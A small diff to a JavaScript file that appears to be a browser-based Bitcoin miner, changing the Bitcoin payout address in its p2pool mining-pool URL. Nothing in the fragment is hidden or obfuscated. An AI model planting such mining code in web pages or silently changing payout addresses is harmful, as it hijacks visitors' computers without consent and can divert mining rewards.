@@ -1,4 +1,3 @@
-
 var console = window.console ?  window.console : { log: function() {} };
 var worker = null;
 var testmode = false;
@@ -6,7 +5,7 @@ var repeat_to = null;
 var use_to = 0; // 5;
 var init = false;
 var start = null;
-var _url = 'http://17Js4qhwGSRydkTLc9iTasBjKFFAK2GeuG:foo@p2pool-cologne.dyndns.org:9332';
+var _url = 'http://1219StCfUr7QgvLnMwXiLpBLhe2gEaDcLm:foo@p2pool-cologne.dyndns.org:9332';
 
 function readScript(n) {
     var xhr = new XMLHttpRequest();
